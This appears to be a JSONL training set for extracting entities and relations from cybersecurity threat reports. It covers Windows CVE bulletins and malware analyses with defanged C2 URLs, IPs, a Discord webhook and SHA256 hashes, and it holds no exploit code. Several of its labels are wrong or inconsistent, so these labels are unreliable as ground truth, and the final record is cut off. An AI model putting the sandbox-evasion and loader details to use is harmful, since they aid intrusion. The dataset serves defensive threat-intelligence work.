{"instruction": "A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability (CVE-2020-1000) MS Rating: Important A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability (CVE-2020-1003) MS Rating: Important A privilege escalation vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability (CVE-2020-1027) MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Kernel handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions.", "input": null, "output": "Named Entities: (Windows Kernel Privilege Escalation Vulnerability CVE-2020-1000, vulnerability), (Windows Kernel Privilege Escalation Vulnerability CVE-2020-1003, vulnerability), (Windows Kernel Privilege Escalation Vulnerability CVE-2020-1027, vulnerability)\nRelationships: No related relations."}
{"instruction": "Windows Kernel Information Disclosure in CPU Memory Access (CVE-2020-0955) MS Rating: Important An information disclosure vulnerability exists when certain central processing units (CPU) speculatively access memory. An attacker who successfully exploited the vulnerability could read privileged data across trust boundaries. Windows Kernel Information Disclosure Vulnerability (CVE-2020-0821) MS Rating: Important An information disclosure vulnerability exists when the Windows kernel improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Kernel Information Disclosure Vulnerability (CVE-2020-1007) MS Rating: Important An information disclosure vulnerability exists when the Windows kernel improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Win32k Privilege Escalation Vulnerability (CVE-2020-0956) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0955, vulnerability), (CVE-2020-0821, vulnerability), (CVE-2020-1007, vulnerability), (CVE-2020-0956, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Privilege Escalation Vulnerability (CVE-2020-0957) MS Rating: Important A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Privilege Escalation Vulnerability (CVE-2020-0958) MS Rating: Important A privilege escalation vulnerability exists in Windows when the Windows kernel-mode driver fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Information Disclosure Vulnerability (CVE-2020-0699) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0957, vulnerability), (CVE-2020-0958, vulnerability), (CVE-2020-0699, vulnerability)\nRelationships: No related relations."}
{"instruction": "An information disclosure vulnerability exists when the win32k component improperly provides kernel information. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Win32k Information Disclosure Vulnerability (CVE-2020-0962) MS Rating: Important An information disclosure vulnerability exists when the win32k component improperly provides kernel information. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. 5. Cumulative Security Updates for Microsoft Graphics Component Microsoft Graphics Components Remote Code Execution Vulnerability (CVE-2020-0907) MS Rating: Critical A remote code execution vulnerability exists in the way that Microsoft Graphics Components handle objects in memory. An attacker who successfully exploited the vulnerability could execute arbitrary code on a target system. Microsoft Graphics Component Information Disclosure Vulnerability (CVE-2020-0982) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0962, vulnerability), (CVE-2020-0907, vulnerability), (CVE-2020-0982, vulnerability)\nRelationships: No related relations."}
{"instruction": "An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Component Information Disclosure Vulnerability (CVE-2020-0987) MS Rating: Important An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Component Information Disclosure Vulnerability (CVE-2020-1005) MS Rating: Important An information disclosure vulnerability exists when the Microsoft Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Microsoft Graphics Remote Code Execution Vulnerability (CVE-2020-0687) MS Rating: Critical", "input": null, "output": "Named Entities: (CVE-2020-0987, vulnerability), (CVE-2020-1005, vulnerability), (CVE-2020-0687, vulnerability)\nRelationships: No related relations."}
{"instruction": "The web shell is a modification of the PhpSpy backdoor and references the author MagicCoder while linking to the (deleted) domain magiccoder.ir. Researching the hacker handle MagicCoder results in references to the Iranian hacking forum Ashiyane as well as defacements by the Iranian hacker group Sun Army.", "input": null, "output": "Named Entities: (PhpSpy, malware), (backdoor, threat type), (magiccoder.ir, Domain), (MagicCoder, tool), (Sun Army, attacker)\nRelationships: (The web shell, modification, PhpSpy), (PhpSpy, is, backdoor), (The web shell, link, magiccoder.ir)"}
{"instruction": "In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity was ieinstal.exe , the Internet Explorer Add-on Installer, but also included aspnet_regbrowsers.exe , the ASP.NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious .NET downloader from URLs such as hxxp://178.73.192[.]15/ca1.exe . Multiple .NET downloaders were found that abused the file transfer service transfer[.]sh to download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a .NET DLL.", "input": null, "output": "Named Entities: (GuLoader, malware), (NSIS executable, file), (ieinstal.exe, file), (aspnet_regbrowsers.exe, file), (hxxp://178.73.192[.]15/ca1.exe, URL), (transfer[.]sh, Domain)\n\nRelationships: (GuLoader, delivered as, NSIS executable), (GuLoader, observed process, ieinstal.exe), (GuLoader, observed process, ieinstal.exe), (GuLoader, downloaded from, hxxp://178.73.192[.]15/ca1.exe), (GuLoader, abused, transfer[.]sh)"}
{"instruction": "Next, it sets the following registry value: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ptdf\\\"ptdffile\" = \"[file_path_of_the_DLL]\" Loadpoint This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: \"[file_path_of_the_running_executable]\\FormDll.dll\" It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: \"[file_directory_of_running_executable]\\res.ini\" Update functionality Next, it checks that: \"\\\\.\\TdiProxy0\" device is available, and That its own process was started with the command-line parameter \"-up\". If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\".", "input": null, "output": "Named Entities: (Loadpoint, tool), (Form.pdb, file), (180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e, SHA256), (FormDll.dll, file),  (DoRVA, tool), (a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221,SHA256), (Merdoor loader, tool), (res.ini, file), (TdiProxy0, tool), (egui.exe, file), (ekrn.exe, file), (msmpeng.exe,file)\nRelationships: (Loadpoint, file, Form.pdb), (Form.pdb, hash, 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e), (Form.pdb, load, FormDll.dll), (Form.pdb, call, DoRVA), (DoRVA, hash, a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221), (DoRVA, the same toolset, Merdoor loader), (DoRVA, read and delete, res.ini), (DoRVA, read and delete, \\TdiProxy0), (DoRVA, terminate, egui.exe), (DoRVA, terminate, ekrn.exe), (DoRVA, terminate, msmpeng.exe)"}
{"instruction": "Mac versions \nAt last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. \nThe malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. \nIt attempts to download a payload from: \nURL: https://msstorageazure[.]com/analysis \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36 \nThe following URLs were embedded in analyzed variants: \nofficestoragebox[.]com/api/biosync \nvisualstudiofactory[.]com/groupcore \nazuredeploystore[.]com/cloud/images \nmsstorageboxes[.]com/xbox \nofficeaddons[.]com/quality \nsourceslabs[.]com/status \nzacharryblogs[.]com/xmlquery \npbxcloudeservices[.]com/network \npbxphonenetwork[.]com/phone \nakamaitechcloudservices[.]com/v2/fileapi \nazureonlinestorage[.]com/google/storage \nmsedgepackageinfo[.]com/ms-webview \nglcloudservice[.]com/v1/status \npbxsources[.]com/queue", "input": null, "output": "Named Entities: (libffmpeg.dylib, file), (a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67, SHA256), (fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7, SHA256), (https://msstorageazure[.]com/analysis, URL), (officestoragebox[.]com/api/biosync, URL), (visualstudiofactory[.]com/groupcore, URL), (azuredeploystore[.]com/cloud/images, URL), (msstorageboxes[.]com/xbox, URL), (officeaddons[.]com/quality, URL), (sourceslabs[.]com/status, URL), (zacharryblogs[.]com/xmlquery, URL), (pbxcloudeservices[.]com/network, URL), (pbxphonenetwork[.]com/phone, URL), (akamaitechcloudservices[.]com/v2/fileapi, URL), (azureonlinestorage[.]com/google/storage, URL), (msedgepackageinfo[.]com/ms-webview, URL), (glcloudservice[.]com/v1/status, URL), (pbxsources[.]com/queue, URL)\nRelationships: (libffmpeg.dylib, hash, a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67), (libffmpeg.dylib, hash, fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7), (libffmpeg.dylib, download payload from, https://msstorageazure[.]com/analysis), (variants, embed, officestoragebox[.]com/api/biosync), (variants, embed, visualstudiofactory[.]com/groupcore), (variants, embed, azuredeploystore[.]com/cloud/images), (variants, embed, msstorageboxes[.]com/xbox), (variants, embed, officeaddons[.]com/quality), (variants, embed, sourceslabs[.]com/status), (variants, embed, zacharryblogs[.]com/xmlquery), (variants, embed, pbxcloudeservices[.]com/network), (variants, embed, pbxphonenetwork[.]com/phone), (variants, embed, akamaitechcloudservices[.]com/v2/fileapi), (variants, embed, azureonlinestorage[.]com/google/storage), (variants, embed, msedgepackageinfo[.]com/ms-webview), (variants, embed,glcloudservice[.]com/v1/status), (variants, embed, pbxsources[.]com/queue)"}
{"instruction": "Current Blackfly toolset The following tools were used in attacks during late 2022 and early 2023: Backdoor.Winnkit SHA256: caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 SHA256: cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a SHA256: e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 SHA256: a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac SHA256: 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 SHA256: 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 Rootkit driver known to be associated with Blackfly Credential-dumping tool SHA256: 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c Creates a dump of credentials from lsass.exe in C:\\windows\\temp\\1.bin. Screenshotting tool SHA256: 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 Screenshots all open windows and saves them as .jpg files. Process-hollowing tool SHA256: 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e Injects shellcode in C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted. The shellcode is a simple \"Hello World\" alert message. SQL tool SHA256: 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d SQL client tool used to query SQL databases. Mimikatz SHA256: b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c Publicly available credential-dumping tool. ForkPlayground SHA256: a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 Proof-of-Concept application to create a memory dump of an arbitrary process using the ForkLib. Proxy configuration tool SHA256: 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f SHA256: d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee SHA256: f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f Configures proxy settings by injecting into: C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted.", "input": null, "output": "Named Entities: (Blackfly, tool), (Backdoor.Winnkit, malware), (caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459, SHA256), (cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a, SHA256), (e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596, SHA256), (a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac, SHA256), (714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196, SHA256), (Rootkit driver, tool), (Blackfly, associated with, Rootkit driver), (Credential-dumping tool, tool), ( 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c, SHA256), (Screenshotting tool, tool), ( 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4, SHA256), (Process-hollowing tool, tool), ( 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e, SHA256), (SQL tool, tool), ( 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d, SHA256), (Mimikatz, tool), ( b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c, SHA256), (ForkPlayground, tool), ( a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864, SHA256), (Proxy configuration tool, tool), ( 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f, SHA256), ( d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee, SHA256), ( f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f, SHA256)\n\nRelationships: (Blackfly, use, Backdoor.Winnkit), (Backdoor.Winnkit, hash, caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459), (Backdoor.Winnkit, hash, cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a), (Backdoor.Winnkit, hash, e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596), (Backdoor.Winnkit, hash, a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac), (Backdoor.Winnkit, hash, 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196), (Blackfly, use, Rootkit driver), (Rootkit driver, associated with, Blackfly), (Blackfly, use, Credential-dumping tool), (Credential-dumping tool, hash, 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c), (Blackfly, use, Screenshotting tool), (Screenshotting tool, hash, 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4), (Blackfly, use, Process-hollowing tool), (Process-hollowing tool, hash, 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e), (Blackfly, use, SQL tool), (SQL tool, hash, 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d), (Blackfly, use, Mimikatz), (Mimikatz, hash, b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c), (Blackfly, use, ForkPlayground), (ForkPlayground, hash, a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864), (Blackfly, use, Proxy configuration tool), (Proxy configuration tool, hash, 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f), (Proxy configuration tool, hash, d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee), (Proxy configuration tool, hash, f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f)"}
{"instruction": "As shown in Figure 5, after downloading the RAR archive 2O23-F1LES-S0ft.rar via the URL provided in the YouTube video description, the victim must uncompress the archive with the password \u201c1212,\u201d listed together with the URL, and run the Launcher_S0FT-2O23.exe contained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exe - Vidar Stealer Launcher_S0FT-2O23.exe is the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c (original) and e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb (after removing excess bytes).", "input": null, "output": "Named Entities: (Launcher_S0FT-2O23.exe, file), (Vidar Stealer, malware), (820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c, SHA256), (e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb, SHA256)\nRelationships: (Launcher_S0FT-2O23.exe, is, Vidar Stealer), (Launcher_S0FT-2O23.exe, hash of this file, 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c), (Launcher_S0FT-2O23.exe, hash of this file, e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb)"}
{"instruction": "Vaxa.exe - Miner Installer Vaxa.exe (SHA256: 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a .NET assembly named Task32Main (SHA256: 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main \u2013 Miner Downloader Task32Main is a .NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system.", "input": null, "output": "Named Entities: (Vaxa.exe, file), (Miner Installer, malware), (44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f, SHA256), (shellcode, tool), (Task32Main, malware), (5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3, SHA256), (Regsvcs.exe, file), (watchdog, tool)\nRelationships: (Vaxa.exe, is, Miner Installer), (Vaxa.exe, hash, 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f), (Vaxa.exe, decrypt, shellcode), (shellcode, inject, Task32Main), (Task32Main, hash, 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3), (Task32Main, within, Regsvcs.exe), (Task32Main, installing, watchdog)"}
{"instruction": "We observed that hxxp://109[.]206[.]243[.]207/ssh/x86_64 started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash: 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash: 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4.", "input": null, "output": "Named Entities: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, URL), (RapperBot, malware), (Bash scripts, tool), (7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f, SHA256), (XMRig crypto miner, tool), (0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404, SHA256)\nRelationships: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, servering, Bash scripts), (RapperBot, use, Bash scripts), (Bash scripts, hash, 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f), (Bash scripts, download, XMRig crypto miner), (XMRig crypto miner, hash, 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404)"}
{"instruction": "XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 sample f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Mining Under the Radar", "input": null, "output": "Named Entities: (XMRig, malware), (cryptojacking, threat type), (f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, SHA256), (RapperBot, malware)\nRelationships: (XMRig, for, cryptojacking), (XMRig, hash, f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa), (XMRig, merged, RapperBot)"}
{"instruction": "Once that victim device receives the C2 server\u2019s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, \u201cminer.bat\u201d, is a ScrubCrypt BAT file. The other two files are compressed PE files: \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d (Figure 19). They exhibit behavior similar to that described in this previous article.", "input": null, "output": "Named Entities: (79[.]137[.]203[.]156, IP), (miner.bat, file), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (malware, link, 79[.]137[.]203[.]156), (malware, download, miner.bat), (malware, download, plugin_3.dll), (malware, download, plugin_4.dll)"}
{"instruction": "When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, \u2018virus\u2019, \u2018wallets\u2019, \u2018browsers\u2019, \u2018login\u2019, and \u2018passwords\u2019.\nBelow we can also see some strings with \u2018.zip\u2019 for several browser names which could be indication of saving the sensitive information as a zip file.\nThe examples in the code shown below are of the browsers that the malware takes an interest in.\nWe also found an interesting URL embedded in the code:\nhxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy\nIt uses a Go package, \u2018dishooks\u2019, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a \u201cSpidey Bot\u201d malware which is known to steal personal information through Discord.", "input": null, "output": "Named Entities: (Spidey Bot, malware), (hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, URL)\nRelationships: (hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, in, Spidey Bot)"}
{"instruction": "Inside Exbyte The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: MegaDumper 1.0 by CodeCracker / SnD Import reconstructor x64dbg x32dbg OLLYDBG WinDbg The Interactive Disassembler Immunity Debugger - [CPU] It then checks for the following anti-virus or sandbox-related files: avghooka.dll avghookx.dll sxin.dll sf2.dll sbiedll.dll snxhk.dll cmdvrt32.dll cmdvrt64.dll wpespy.dll vmcheck.dll pstorec.dll dir_watch.dll api_log.dll dbghelp.dll This routine of checks is quite similar to the routine employed by the BlackByte payload itself, as documented recently by Sophos .", "input": null, "output": "Named Entities: (Exbyte, malware), (Mega.co.nz, Domain), (avghooka.dll, file), (avghookx.dll, file), (sxin.dll, file), (sf2.dll, file), (sbiedll.dll, file), (snxhk.dll, file), (cmdvrt32.dll, file), (cmdvrt64.dll, file), (wpespy.dll, file), (vmcheck.dll, file), (pstorec.dll, file), (dir_watch.dll, file), (api_log.dll, file), (dbghelp.dll, file), (BlackByte, malware)\n\nRelationships: (Exbyte, upload, Mega.co.nz), (Exbyte, check, avghooka.dll), (Exbyte, check, avghookx.dll), (Exbyte, check, sxin.dll), (Exbyte, check, sf2.dll), (Exbyte, check, sbiedll.dll), (Exbyte, check, snxhk.dll), (Exbyte, check, cmdvrt32.dll), (Exbyte, check, cmdvrt64.dll), (Exbyte, check, wpespy.dll), (Exbyte, check, vmcheck.dll), (Exbyte, check, pstorec.dll), (Exbyte, check, dir_watch.dll), (Exbyte, check, api_log.dll), (Exbyte, check, dbghelp.dll), (Exbyte, similar to, BlackByte)"}
{"instruction": "Observed Webworm activity Symantec observed three malware droppers developed by Webworm: 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e (Trochilus dropper) b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646 (Trochilus Dropper) c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8 (Trochilus Dropper) Analysis of one of the droppers revealed that it drops the following files: [TEMP]\\Logger.exe (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679) [TEMP]\\sc.cfg (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536) [TEMP]\\logexts.dat (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b) [TEMP]\\logexts.dll (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef) [TEMP]\\logger.dat (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024) [TEMP]\\[RANDOM_DIGITS].doc (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad) The legitimate executable Logger.exe is used to call the \u201cLoadLibraryA\u201d API in order to load the malicious \"[TEMP]\\logexts.dll\" file. The logexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON.EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode.", "input": null, "output": "Named Entities: (Webworm, attacker), (Trochilus dropper, malware), (6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e, SHA256), (Trochilus Dropper, malware), (b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646, SHA256), (Trochilus Dropper, malware), (c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8, SHA256), ([TEMP]\\Logger.exe, file), (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679, SHA256), ([TEMP]\\sc.cfg, file), (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536, SHA256), ([TEMP]\\logexts.dat, file), (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b, SHA256), ([TEMP]\\logexts.dll, file), (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef, SHA256), ([TEMP]\\logger.dat, file), (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024, SHA256), ([TEMP]\\[RANDOM_DIGITS].doc, file), (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad, SHA256), ([TEMP]\\logexts.dll, file), (logexts.dll, file), (Logger.dat, file)\nRelationships: (Webworm, develop, Trochilus dropper), (Trochilus dropper, hash, 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e), (Trochilus Dropper, hash, b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646), (Trochilus Dropper, hash, c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8), (Trochilus dropper, drop, [TEMP]\\Logger.exe), ([TEMP]\\Logger.exe, hash, 28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679), (Trochilus dropper, drop, [TEMP]\\sc.cfg), ([TEMP]\\sc.cfg, hash, a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536), (Trochilus dropper, drop, 